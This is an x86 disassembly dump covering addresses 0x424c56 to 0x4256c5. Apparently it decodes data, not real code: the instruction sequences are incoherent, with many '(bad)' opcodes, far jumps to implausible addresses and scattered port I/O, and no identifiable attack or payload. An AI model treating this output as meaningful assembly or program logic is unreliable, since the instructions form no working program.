  424c56:	and    BYTE PTR [ecx+0x5e5566ac],0x5
  424c5d:	xchg   esi,eax
  424c5e:	pop    edi
  424c5f:	mov    esi,0xae4b134a
  424c64:	xlat   BYTE PTR cs:[ebx]
  424c66:	pop    ebx
  424c67:	xchg   edx,eax
  424c68:	call   0x12e6:0x1d42cc7b
  424c6f:	jge    0x424c89
  424c71:	das    
  424c72:	adc    eax,DWORD PTR [edi-0x46]
  424c75:	test   DWORD PTR [edi-0x69],edx
  424c78:	cld    
  424c79:	fisttp QWORD PTR [ebx-0x21]
  424c7c:	jg     0x424cfd
  424c7e:	dec    esi
  424c7f:	test   BYTE PTR [ebx-0x404e3f0e],bl
  424c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c86:	loope  0x424ce4
  424c88:	add    BYTE PTR [edi],ch
  424c8a:	retf   0xa81b
  424c8d:	lahf   
  424c8e:	call   0x424d45
	...
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	loopne 0x424ca0
  424d02:	inc    ebp
  424d03:	test   eax,0x188ac
  424d08:	add    al,0x1
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	call   0x81cb:0xde4038e6
  424d13:	add    bh,BYTE PTR [ebx+0x4f657546]
  424d19:	sbb    ch,BYTE PTR [ebp+0x1f]
  424d1c:	nop
  424d1d:	popa   
  424d1e:	push   ebp
  424d1f:	call   0xd9fb:0x97d9848
  424d26:	arpl   WORD PTR [eax],sp
  424d28:	mov    dl,0x5f
  424d2a:	popf   
  424d2b:	xor    DWORD PTR [ecx],esp
  424d2d:	lahf   
  424d2e:	sti    
  424d2f:	cwde   
  424d30:	add    ecx,DWORD PTR [ecx]
  424d32:	inc    ecx
  424d33:	out    dx,eax
  424d34:	mov    ds:0xe93e1cdd,al
  424d39:	out    dx,eax
  424d3a:	adc    dh,BYTE PTR [ecx-0x19]
  424d3d:	sbb    ah,dl
  424d3f:	cmp    DWORD PTR [eax],esi
  424d41:	scas   eax,DWORD PTR es:[edi]
  424d42:	shl    DWORD PTR [ecx+0x3f600c1e],cl
  424d48:	int3   
  424d49:	fwait
  424d4a:	jo     0x424d35
  424d4c:	pop    edi
  424d4d:	jb     0x424cda
  424d4f:	stos   BYTE PTR es:[edi],al
  424d50:	fdiv   st,st(6)
  424d52:	call   0x118e143a
  424d57:	xchg   esp,eax
  424d58:	jp     0x424d94
  424d5a:	mov    esp,0xfb609e5e
  424d5f:	pop    esp
  424d60:	js     0x424d69
  424d62:	shr    DWORD PTR [ecx-0x76e3b862],1
  424d68:	ret    0xf9b8
  424d6b:	sub    al,0xa6
  424d6d:	popf   
  424d6e:	adc    ah,BYTE PTR [ebp-0x6a7322b1]
  424d74:	adc    DWORD PTR [ebp-0x6e],eax
  424d77:	inc    edi
  424d78:	jmp    0x78c0:0xc3bc6e4c
  424d7f:	or     DWORD PTR [ebx-0x79a85260],esi
  424d85:	mov    cl,0xe
  424d87:	jo     0x424d89
  424d89:	push   0xc3dae37d
  424d8e:	enter  0xb0cc,0xda
  424d92:	adc    BYTE PTR [edi-0x6c],bl
  424d95:	jge    0x424df1
  424d97:	sbb    DWORD PTR [edx+0x28455716],edi
  424d9d:	sti    
  424d9e:	leave  
  424d9f:	repz test BYTE PTR [eax+0xe],dl
  424da3:	xor    ah,al
  424da5:	jmp    0x424d7b
  424da7:	data16 in al,dx
  424da9:	in     eax,0x0
  424dab:	(bad)  
  424dac:	pop    ds
  424dad:	fdivrp st(6),st
  424daf:	adc    bl,BYTE PTR [eax]
  424db1:	sbb    al,cl
  424db3:	pop    ecx
  424db4:	push   es
  424db5:	or     ebx,esi
  424db7:	xor    DWORD PTR [ecx-0x369c9f8c],0x1048d8c7
  424dc1:	mov    bh,0x20
  424dc3:	push   ebx
  424dc4:	fsubr  DWORD PTR [esi+0x36f9470d]
  424dca:	repz popf 
  424dcc:	xor    cl,BYTE PTR [esi]
  424dce:	popa   
  424dcf:	outs   dx,DWORD PTR ds:[esi]
  424dd0:	xor    al,BYTE PTR [edi-0x1dfcda4d]
  424dd6:	adc    eax,0x1958a450
  424ddb:	mov    es,WORD PTR [edx-0x56]
  424dde:	xchg   ecx,eax
  424ddf:	jnp    0x424e04
  424de1:	dec    edi
  424de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424de3:	and    al,0x92
  424de5:	cmp    dh,bl
  424de7:	sub    BYTE PTR [edi+edi*1-0x4a],0xc6
  424dec:	in     al,dx
  424ded:	cli    
  424dee:	xchg   DWORD PTR [ebp+0x30],esi
  424df1:	int3   
  424df2:	int    0x81
  424df4:	or     DWORD PTR [ecx+0x465bd09b],ebx
  424dfa:	(bad)  
  424dfb:	cmp    al,0x5f
  424dfd:	mov    dh,0x7b
  424dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e00:	call   0x7cf4:0x7060aec1
  424e07:	mov    cl,0x54
  424e09:	xor    cl,BYTE PTR [ebp-0x1]
  424e0c:	daa    
  424e0d:	dec    ecx
  424e0e:	sahf   
  424e0f:	sub    DWORD PTR [eax],eax
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424eca
  424e81:	inc    ecx
  424e82:	jnp    0x424e82
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	retf   0x38a8
  424e8f:	pop    ds
  424e90:	cli    
  424e91:	pop    esp
  424e92:	jmp    0xa9d9ee17
  424e97:	push   0x93ab2d8a
  424e9c:	sbb    dh,BYTE PTR [ebp-0x4554abdf]
  424ea2:	out    dx,eax
  424ea3:	aas    
  424ea4:	inc    ecx
  424ea5:	js     0x424f03
  424ea7:	pop    ds
  424ea8:	popa   
  424ea9:	sti    
  424eaa:	or     BYTE PTR [ecx+0x3b],0x4b
  424eae:	mov    al,0x1
  424eb0:	bound  esp,QWORD PTR [ecx]
  424eb2:	lea    edx,[edx+0x9c383f]
  424eb8:	mov    al,0xdf
  424eba:	(bad)  
  424ebb:	in     al,0xcd
  424ebd:	and    eax,0xc1077eb8
  424ec2:	std    
  424ec3:	pop    es
  424ec4:	xor    cl,BYTE PTR [esi-0x1d]
  424ec7:	lds    ebp,FWORD PTR [ebx-0x6ceb812f]
  424ecd:	push   es
  424ece:	and    BYTE PTR [esi-0x77],cl
  424ed1:	enter  0x96a3,0x85
  424ed5:	in     al,dx
  424ed6:	add    DWORD PTR [eax+0x6],ebp
  424ed9:	(bad)  
  424eda:	cld    
  424edb:	leave  
  424edc:	fwait
  424edd:	cmp    ecx,DWORD PTR [edi-0x13fc1ad7]
  424ee3:	cmc    
  424ee4:	daa    
  424ee5:	out    0xba,eax
  424ee7:	jle    0x424eaa
  424ee9:	out    0x9b,eax
  424eeb:	mov    ds:0xa42cf8ec,al
  424ef0:	out    0xe,eax
  424ef2:	stc    
  424ef3:	(bad)  
  424ef4:	cwde   
  424ef5:	std    
  424ef6:	js     0x424f30
  424ef8:	or     dl,ch
  424efa:	adc    al,0x62
  424efc:	mov    dh,0x84
  424efe:	xor    eax,0x7bbfb531
  424f03:	cli    
  424f04:	pop    es
  424f05:	pop    ecx
  424f06:	aas    
  424f07:	ja     0x424f17
  424f09:	add    ebx,esp
  424f0b:	xchg   DWORD PTR [ebx],ebx
  424f0d:	iret   
  424f0e:	fiadd  DWORD PTR [eax+esi*1-0x78ee0968]
  424f15:	and    edx,DWORD PTR [eax-0x30]
  424f18:	(bad)  
  424f19:	cld    
  424f1a:	test   BYTE PTR [eax],ch
  424f1c:	gs cmp al,BYTE PTR fs:[eax]
  424f20:	in     eax,0xf0
  424f22:	test   DWORD PTR [ecx],ecx
  424f24:	push   esi
  424f25:	(bad)  [ebx-0x47]
  424f29:	inc    ecx
  424f2a:	ja     0x424ef0
  424f2c:	mov    eax,ds:0x81a3fc2
  424f31:	frstor [ebp+0x35]
  424f34:	jo     0x424fb2
  424f36:	inc    ebp
  424f37:	dec    ebx
  424f38:	sbb    edi,edx
  424f3a:	inc    edi
  424f3b:	in     eax,0xec
  424f3d:	xchg   BYTE PTR [ebx],bh
  424f3f:	sub    DWORD PTR ds:0xc544d47,edx
  424f45:	loope  0x424fb6
  424f47:	pop    ds
  424f48:	xchg   esi,eax
  424f49:	mov    edi,0xae584876
  424f4e:	call   0x73d2:0x7d783d96
  424f55:	outs   dx,DWORD PTR ds:[si]
  424f57:	mov    dh,0x95
  424f59:	sbb    edi,edi
  424f5b:	mov    esp,0x4b0daf98
  424f60:	cvtps2pi mm4,QWORD PTR [ebp-0x50437d1d]
  424f67:	push   esi
  424f68:	mov    eax,ds:0xf5c600e9
  424f6d:	fwait
  424f6e:	sar    BYTE PTR [esi-0x36],1
  424f71:	push   ss
  424f72:	jg     0x424f42
  424f74:	pop    edx
  424f75:	call   0xf016138c
  424f7a:	shr    DWORD PTR [esi-0x736a6027],cl
  424f80:	mov    cl,0xb3
  424f82:	bound  ebp,QWORD PTR [eax+esi*8]
  424f85:	pop    ecx
  424f86:	test   dl,dl
  424f88:	(bad)  
  424f89:	push   0x3b
  424f8b:	sbb    DWORD PTR [ebx-0x40],esp
  424f8e:	pop    esi
  424f8f:	mov    edx,0x0
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	ror    DWORD PTR [ecx],cl
  425002:	mov    DWORD PTR [edi+0x18ab4],edx
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	sbb    DWORD PTR [ebx-0x613fb218],0xc39ddfd6
  425016:	pop    es
  425017:	push   esi
  425018:	push   es
  425019:	and    eax,0x8a5968a5
  42501e:	adc    esi,DWORD PTR [ebp+ebx*1+0x1c]
  425022:	iret   
  425023:	inc    esp
  425024:	jmp    0xe120:0xcdb85e2
  42502b:	(bad)  
  42502c:	(bad)  
  42502d:	aas    
  42502e:	loop   0x424fc9
  425030:	(bad)  
  425031:	dec    esi
  425032:	rcl    edx,cl
  425034:	sub    BYTE PTR [ebx],bl
  425036:	push   cs
  425037:	(bad)  
  425038:	mov    ah,BYTE PTR [eax]
  42503a:	and    al,0xe1
  42503c:	loop   0x4250b7
  42503e:	bound  edi,QWORD PTR [edi+0x71e6adcd]
  425044:	jp     0x425085
  425046:	nop
  425047:	adc    al,0x59
  425049:	ficom  WORD PTR [esi]
  42504b:	push   ebx
  42504c:	cli    
  42504d:	adc    dl,BYTE PTR [bp+si-0x38fc]
  425052:	sub    esp,eax
  425054:	mov    edi,0xa6f64603
  425059:	jb     0x4250a6
  42505b:	mov    dh,0xe7
  42505d:	pop    esi
  42505e:	mov    ah,0x92
  425060:	lods   al,BYTE PTR ds:[esi]
  425061:	push   0xffffffb9
  425063:	mov    WORD PTR [edi-0xc3b444f],gs
  425069:	arpl   WORD PTR [esp-0x6ffc457b],bx
  425070:	inc    ebx
  425071:	sub    cl,BYTE PTR [eax-0x12]
  425074:	in     eax,dx
  425075:	lods   eax,DWORD PTR ds:[esi]
  425076:	push   eax
  425077:	inc    ecx
  425078:	cli    
  425079:	pop    es
  42507a:	push   es
  42507b:	and    edi,DWORD PTR [edi+0x667f23db]
  425081:	pop    ds
  425082:	cmp    bh,BYTE PTR [edx+0x63eaba40]
  425088:	xchg   edx,eax
  425089:	ss test al,0x74
  42508c:	arpl   WORD PTR [edi+eax*1],bp
  42508f:	iret   
  425090:	dec    esp
  425091:	mov    eax,0x34656fc8
  425096:	mov    gs,WORD PTR [ecx-0x35]
  425099:	test   DWORD PTR [ebx],0x633ef68f
  42509f:	hlt    
  4250a0:	push   ss
  4250a1:	stos   BYTE PTR es:[edi],al
  4250a2:	fwait
  4250a3:	xchg   ebp,eax
  4250a4:	ds inc esi
  4250a6:	arpl   WORD PTR [edx+edi*8],si
  4250a9:	push   esi
  4250aa:	sahf   
  4250ab:	xchg   esi,esp
  4250ad:	xchg   edi,eax
  4250ae:	lods   eax,DWORD PTR ds:[esi]
  4250af:	clc    
  4250b0:	or     al,0xba
  4250b2:	ja     0x425041
  4250b4:	mov    BYTE PTR [edi-0x27],al
  4250b7:	mov    ah,0x33
  4250b9:	push   esi
  4250ba:	push   ebp
  4250bb:	mov    dl,0xc2
  4250bd:	mov    al,ds:0x9cb43870
  4250c2:	in     eax,0xcb
  4250c4:	in     eax,0xa8
  4250c6:	jb     0x42505b
  4250c8:	sbb    bh,BYTE PTR [ecx]
  4250ca:	pop    edi
  4250cb:	push   edi
  4250cc:	adc    eax,0xbf789395
  4250d1:	ss repz push ebp
  4250d4:	cld    
  4250d5:	(bad)  [eax+0x7f]
  4250d8:	shl    BYTE PTR [ebp+0x5fae6e70],cl
  4250de:	into   
  4250df:	lea    ebx,[esi]
  4250e1:	mov    BYTE PTR [ebp-0x11c00aa4],bh
  4250e7:	cdq    
  4250e8:	or     bx,WORD PTR ds:0xd0de82e3
  4250ef:	cmp    bl,bh
  4250f1:	or     BYTE PTR [edx+0x74],0xc1
  4250f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250f6:	cmc    
  4250f7:	ins    BYTE PTR es:[edi],dx
  4250f8:	and    DWORD PTR [ecx+ecx*8+0x6ff1e77c],ebx
  4250ff:	push   0xeb1612b
  425104:	xor    al,al
  425106:	fisubr WORD PTR [edi-0x6d]
  425109:	into   
  42510a:	mov    dh,0x1d
  42510c:	(bad)  
  42510d:	pop    esp
  42510e:	jo     0x4250f0
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x25c8:0x180b92e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    al,ch
  42518d:	je     0x425116
  42518f:	fist   WORD PTR [ecx+0x72]
  425192:	or     ecx,esi
  425194:	push   eax
  425195:	mov    al,ds:0x3003f6e3
  42519a:	mov    BYTE PTR [esi],ch
  42519c:	bound  eax,QWORD PTR [eax]
  42519e:	mov    ah,0x43
  4251a0:	inc    esi
  4251a1:	pop    esp
  4251a2:	stos   DWORD PTR es:[edi],eax
  4251a3:	stos   BYTE PTR es:[edi],al
  4251a4:	adc    edi,DWORD PTR [esi]
  4251a6:	adc    esp,DWORD PTR fs:[ecx]
  4251a9:	stos   BYTE PTR es:[edi],al
  4251aa:	dec    ecx
  4251ab:	mov    eax,esi
  4251ad:	outs   dx,DWORD PTR ds:[esi]
  4251ae:	stos   DWORD PTR es:[edi],eax
  4251af:	sub    ch,BYTE PTR [edi-0x67]
  4251b2:	cdq    
  4251b3:	xchg   edx,eax
  4251b4:	(bad)  
  4251b5:	ins    BYTE PTR es:[edi],dx
  4251b6:	fld    QWORD PTR [edx+ecx*2+0x63]
  4251ba:	or     BYTE PTR [eax-0xe7f91d5],0x65
  4251c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251c2:	jp     0x425205
  4251c4:	call   FWORD PTR [edi+0x1e]
  4251c7:	sub    dh,bl
  4251c9:	ds test eax,0x87163938
  4251cf:	(bad)  
  4251d0:	pusha  
  4251d1:	mov    cl,0x71
  4251d3:	repz add DWORD PTR [edi],ecx
  4251d6:	or     DWORD PTR [ecx-0x2f70d37c],edx
  4251dc:	sar    BYTE PTR [edi],0x76
  4251df:	xchg   dx,ax
  4251e1:	in     al,0xce
  4251e3:	stos   BYTE PTR es:[edi],al
  4251e4:	repnz and BYTE PTR [eax],ch
  4251e7:	pop    es
  4251e8:	fmul   QWORD PTR ds:0xc652f8ea
  4251ee:	ss sbb al,0xaf
  4251f1:	inc    edi
  4251f2:	stos   DWORD PTR es:[edi],eax
  4251f3:	les    eax,FWORD PTR ds:0xc40daeac
  4251f9:	pop    esi
  4251fa:	push   ss
  4251fb:	sbb    eax,DWORD PTR [ebp+0x2735ae73]
  425201:	fs push esp
  425203:	xchg   esi,eax
  425204:	stos   BYTE PTR es:[edi],al
  425205:	imul   esp,DWORD PTR ds:0x243cacf2,0xffffff97
  42520c:	gs inc ebx
  42520e:	xchg   DWORD PTR ds:0x5c1f6a35,ecx
  425214:	pop    ds
  425215:	mov    BYTE PTR gs:[edi],dh
  425218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425219:	aad    0x6c
  42521b:	nop
  42521c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42521d:	jns    0x425291
  42521f:	xlat   BYTE PTR ds:[ebx]
  425220:	jmp    0x4252a1
  425222:	inc    edx
  425223:	call   0xea44:0xff018b7b
  42522a:	je     0x425290
  42522c:	jne    0x425244
  42522e:	nop    ebp
  425231:	daa    
  425232:	push   ds
  425233:	repz xor DWORD PTR [ecx+edi*4+0x52],esp
  425238:	retf   0xb169
  42523b:	daa    
  42523c:	jmp    0xc3c0:0xd893fc81
  425243:	test   BYTE PTR ds:0xb9884a8,0x4f
  42524a:	pop    ds
  42524b:	mov    edi,0x9d60dd12
  425250:	inc    edx
  425251:	sahf   
  425252:	and    ebp,eax
  425254:	sbb    DWORD PTR ds:0x1e52b660,edx
  42525a:	fdiv   DWORD PTR [esi+0x111d3d49]
  425260:	leave  
  425261:	mov    esp,DWORD PTR [ebp-0x253b421d]
  425267:	mov    eax,0x606c007
  42526c:	jo     0x4252ab
  42526e:	fxam   
  425270:	mov    edx,0x5adfdf64
  425275:	xchg   BYTE PTR [ebp-0x14509e21],cl
  42527b:	daa    
  42527c:	cld    
  42527d:	jle    0x42523a
  42527f:	and    DWORD PTR [eax],edi
  425281:	mov    ds:0x1b11c83,eax
  425286:	pop    esp
  425287:	ficomp WORD PTR [edi+0x2dab0c2b]
  42528d:	jb     0x425222
  42528f:	and    al,0x0
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	pop    ds
  425301:	shr    DWORD PTR [esi],1
  425303:	hlt    
  425304:	mov    esp,0x400018c
  425309:	add    DWORD PTR [eax],eax
  42530b:	add    BYTE PTR [ecx],dl
  42530d:	rcr    BYTE PTR [ecx],0x91
  425310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425311:	int    0xc
  425313:	ss sahf 
  425315:	mov    ss,edx
  425317:	sbb    dh,bh
  425319:	retf   
  42531a:	int    0xaf
  42531c:	(bad)  
  42531d:	jmp    0x425394
  42531f:	sub    eax,0x84116baa
  425324:	cmp    esp,esp
  425326:	adc    DWORD PTR ds:0x48216131,ebx
  42532c:	push   ss
  42532d:	jno    0x4253a8
  42532f:	sub    edx,DWORD PTR [edi+0x1]
  425332:	mov    esi,0x769c58aa
  425337:	add    BYTE PTR [edi+0x28f65a99],0x9d
  42533e:	test   eax,0xb2a7c998
  425343:	add    al,0xcb
  425345:	mov    ds:0x61bdfda9,eax
  42534a:	test   al,0xf9
  42534c:	(bad)  
  42534d:	xchg   BYTE PTR [edi+0x4e89302b],al
  425353:	mov    ch,0x4b
  425355:	cmp    al,0x1b
  425357:	mov    ecx,0xa0ed2898
  42535c:	retf   0x1bae
  42535f:	dec    ebp
  425360:	sub    dh,BYTE PTR [esp+ebp*2-0x17]
  425364:	sub    ch,bh
  425366:	out    dx,al
  425367:	test   eax,0x1acabd41
  42536c:	call   0x6d2f17e4
  425371:	das    
  425372:	int3   
  425373:	pop    ds
  425374:	adc    DWORD PTR cs:[esi+0x1e],0xac754198
  42537c:	inc    esp
  42537d:	xchg   ebx,eax
  42537e:	push   esi
  42537f:	fwait
  425380:	xor    bl,ah
  425382:	xchg   esi,eax
  425383:	push   es
  425384:	fwait
  425385:	pop    esi
  425386:	mov    dh,0x1
  425388:	sub    esp,eax
  42538a:	iret   
  42538b:	add    BYTE PTR [edi],dh
  42538d:	mov    fs,WORD PTR [eax+eiz*8+0x3f2bee36]
  425394:	std    
  425395:	cld    
  425396:	aam    0x85
  425398:	mov    cl,0xbc
  42539a:	jno    0x42536e
  42539c:	mov    al,0xdb
  42539e:	jl     0x4253b8
  4253a0:	mov    dl,0x6e
  4253a2:	jbe    0x425333
  4253a4:	push   esi
  4253a5:	aaa    
  4253a6:	popf   
  4253a7:	scas   al,BYTE PTR es:[edi]
  4253a8:	and    eax,0xfac8ceb2
  4253ad:	or     eax,0x36d516e1
  4253b2:	aas    
  4253b3:	fsubr  st(3),st
  4253b5:	and    dl,ah
  4253b7:	xchg   eax,eax
  4253b9:	daa    
  4253ba:	push   ecx
  4253bb:	icebp  
  4253bc:	xchg   ebp,eax
  4253bd:	add    DWORD PTR [esi-0x13],esi
  4253c0:	xor    bh,dl
  4253c2:	lods   al,BYTE PTR ds:[esi]
  4253c3:	cli    
  4253c4:	mov    dl,0xc7
  4253c6:	adc    DWORD PTR [eax],ebx
  4253c8:	popf   
  4253c9:	shl    DWORD PTR ds:0x4e3f0b27,1
  4253cf:	xchg   ebx,eax
  4253d0:	inc    edx
  4253d1:	fwait
  4253d2:	xor    ecx,DWORD PTR [edx-0x47945725]
  4253d8:	cld    
  4253d9:	ins    DWORD PTR es:[edi],dx
  4253da:	push   ebx
  4253db:	mov    bh,0x0
  4253dd:	repz adc ch,BYTE PTR [eax-0x24277c56]
  4253e4:	ins    DWORD PTR es:[edi],dx
  4253e5:	out    dx,al
  4253e6:	and    BYTE PTR [eax],ch
  4253e8:	inc    esp
  4253e9:	loop   0x425457
  4253eb:	hlt    
  4253ec:	xor    DWORD PTR ds:0xd841ba1,ebp
  4253f2:	fcomp  DWORD PTR [ecx+0x2f]
  4253f5:	shl    BYTE PTR [esi],cl
  4253f7:	stos   BYTE PTR es:[edi],al
  4253f8:	sbb    ecx,DWORD PTR [eax-0xf1c4b12]
  4253fe:	mov    bh,0x39
  425400:	hlt    
  425401:	pop    esi
  425402:	xor    ch,BYTE PTR [edx-0x40914276]
  425408:	jge    0x4253b4
  42540a:	push   ebx
  42540b:	xor    BYTE PTR [esi+0xf491d6],0x0
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebp,ecx
  425481:	retf   0x7329
  425484:	ror    BYTE PTR [ebp+0x1040001],0x0
  42548b:	add    cl,ah
  42548d:	out    dx,al
  42548e:	jl     0x4254e7
  425490:	test   BYTE PTR [bp+si-0x43],dl
  425494:	mov    ah,0x23
  425496:	jge    0x4254b8
  425498:	outs   dx,DWORD PTR ds:[esi]
  425499:	scas   al,BYTE PTR es:[edi]
  42549a:	mov    ds:0xdd5d6301,eax
  42549f:	mov    ecx,0x3a008b19
  4254a4:	xchg   esi,ebp
  4254a6:	jno    0x425497
  4254a8:	inc    ecx
  4254a9:	int    0x32
  4254ab:	loope  0x4254b2
  4254ad:	test   eax,0x537e29a2
  4254b2:	mov    dl,0xc9
  4254b4:	adc    dl,al
  4254b6:	into   
  4254b7:	fdiv   QWORD PTR [edi-0x56]
  4254ba:	aam    0xea
  4254bc:	cwde   
  4254bd:	dec    edx
  4254be:	and    eax,0xd3c77063
  4254c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254c4:	sub    BYTE PTR [esi+0xe],cl
  4254c7:	mov    eax,0x82b396d
  4254cc:	mov    ecx,DWORD PTR ds:0xb74ea463
  4254d2:	pop    ebx
  4254d3:	pop    esp
  4254d4:	or     esp,esi
  4254d6:	jle    0x4254f9
  4254d8:	ret    
  4254d9:	hlt    
  4254da:	jg     0x4254ac
  4254dc:	cld    
  4254dd:	fisub  WORD PTR [edx+0x1cebddce]
  4254e3:	cwde   
  4254e4:	cmp    ah,ch
  4254e6:	sub    BYTE PTR [esi],dh
  4254e8:	mov    ch,0xa
  4254ea:	sub    ch,BYTE PTR [ecx]
  4254ec:	dec    esi
  4254ed:	stos   BYTE PTR es:[edi],al
  4254ee:	adc    esp,0x20
  4254f1:	or     edx,edi
  4254f3:	out    dx,al
  4254f4:	mov    ebp,esp
  4254f6:	js     0x425540
  4254f8:	add    al,0xaf
  4254fa:	dec    ebp
  4254fb:	dec    edx
  4254fc:	sbb    al,0xaf
  4254fe:	cmp    BYTE PTR [esi+0x70],ch
  425501:	xchg   edi,eax
  425502:	push   cs
  425503:	mov    BYTE PTR [esi+0x7f696408],cl
  425509:	and    ax,0x4e2f
  42550d:	hlt    
  42550e:	jae    0x42552c
  425510:	cmp    cl,bh
  425512:	imul   edx,DWORD PTR [esi-0x3a],0xffffffda
  425516:	or     cl,ch
  425518:	adc    ch,BYTE PTR ds:0xaa745156
  42551e:	ins    DWORD PTR es:[edi],dx
  42551f:	stos   BYTE PTR es:[edi],al
  425520:	dec    esi
  425521:	stos   BYTE PTR es:[edi],al
  425522:	outs   dx,BYTE PTR ds:[esi]
  425523:	cld    
  425524:	sbb    eax,0x77ec2420
  425529:	xor    dh,BYTE PTR [ecx-0xc6104d9]
  42552f:	sbb    DWORD PTR [eax+0x45b5d4fb],esp
  425535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425536:	push   es
  425537:	cli    
  425538:	jns    0x42559d
  42553a:	cwde   
  42553b:	mov    esi,0x9d26277
  425540:	or     eax,DWORD PTR [esi-0x3d503bd]
  425546:	test   eax,0x5212d130
  42554b:	dec    ebx
  42554c:	(bad)  
  42554d:	cmp    ebx,DWORD PTR [edi+0x11]
  425550:	inc    eax
  425551:	into   
  425552:	pop    ss
  425553:	push   esp
  425554:	test   BYTE PTR [edx+0x16f06f7a],0x93
  42555b:	iret   
  42555c:	mov    esi,0x1472a02a
  425561:	xor    DWORD PTR [edx+0x279806a9],ebx
  425567:	ja     0x425533
  425569:	cld    
  42556a:	cmp    al,0x68
  42556c:	div    DWORD PTR [edx+eax*1+0x6ff30dd8]
  425573:	rcr    dl,0x2b
  425576:	or     edx,edx
  425578:	push   ebx
  425579:	mov    esp,0x929343fa
  42557e:	fwait
  42557f:	pushf  
  425580:	and    ecx,DWORD PTR [edx+0x67]
  425583:	cmp    DWORD PTR [eax+0x31a92953],0x1e
  42558a:	cmp    BYTE PTR [eax+esi*4+0x8fd6e8],dl
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x59aff13a
  425602:	enter  0xc431,0x8e
  425606:	add    DWORD PTR [eax],eax
  425608:	add    al,0x1
  42560a:	add    BYTE PTR [eax],al
  42560c:	inc    ebx
  42560d:	and    DWORD PTR [edi-0x53930f9e],edi
  425613:	xlat   BYTE PTR ds:[ebx]
  425614:	adc    al,BYTE PTR [ebp-0x584f6fa6]
  42561a:	pusha  
  42561b:	mov    ebx,fs
  42561d:	jno    0x425677
  42561f:	sub    DWORD PTR [edx-0x3bca39f0],edi
  425625:	pop    esi
  425626:	adc    ecx,DWORD PTR [ecx]
  425628:	pop    es
  425629:	add    al,0x6d
  42562b:	dec    eax
  42562c:	dec    ebx
  42562d:	bound  eax,QWORD PTR [eax+0x1d]
  425630:	cmc    
  425631:	mov    edi,0xb315cbb
  425636:	inc    ebp
  425637:	gs dec ebp
  425639:	and    dl,BYTE PTR [edi+0x3]
  42563c:	inc    edx
  42563d:	pop    edx
  42563e:	jnp    0x42566d
  425640:	cwde   
  425641:	jns    0x425658
  425643:	jbe    0x425662
  425645:	icebp  
  425646:	enter  0x4b30,0x1e
  42564a:	loop   0x42560b
  42564c:	outs   dx,DWORD PTR ds:[esi]
  42564d:	sub    ebx,DWORD PTR [ecx+0x13629183]
  425653:	xor    DWORD PTR [ebx+0x7d],esi
  425656:	fstp   QWORD PTR [ecx+ebx*2+0x5c]
  42565a:	pop    es
  42565b:	xor    ebx,DWORD PTR [edi+eiz*1+0x3e]
  42565f:	aas    
  425660:	add    eax,0xa1b57b7a
  425665:	xchg   edx,eax
  425666:	sbb    eax,0xe3197fa7
  42566b:	mov    bh,bl
  42566d:	ins    BYTE PTR es:[edi],dx
  42566e:	nop
  42566f:	jl     0x4256f0
  425671:	cs push edx
  425673:	pushf  
  425674:	cmp    ecx,DWORD PTR [ecx]
  425676:	sub    esi,eax
  425678:	adc    DWORD PTR [ecx+ecx*4-0x7ed4ceaa],edx
  42567f:	pop    ds
  425680:	ss stos DWORD PTR es:[edi],eax
  425682:	jmp    0xea8:0x4c70cc15
  425689:	out    0x7a,al
  42568b:	jno    0x425697
  42568d:	(bad)  
  42568e:	jmp    DWORD PTR [esi+eax*8+0x32c386d7]
  425695:	pop    ecx
  425696:	pop    edx
  425697:	jmp    0x274b:0xe43d82dd
  42569e:	push   cs
  42569f:	dec    esp
  4256a0:	sub    eax,0xed21b3fc
  4256a5:	cmp    esi,eax
  4256a7:	dec    ebx
  4256a8:	pop    edi
  4256a9:	sbb    ch,bh
  4256ab:	ja     0x425635
  4256ad:	push   0xf5a63224
  4256b2:	jns    0x425698
  4256b4:	shl    BYTE PTR [edi+ecx*8+0x4e],0xb
  4256b9:	sbb    dl,bl
  4256bb:	mov    bh,0x6a
  4256bd:	or     al,0xca
  4256bf:	mov    BYTE PTR [ecx+ebp*4-0x69],bh
  4256c3:	jb     0x4256cc
  4256c5:	push   ebp
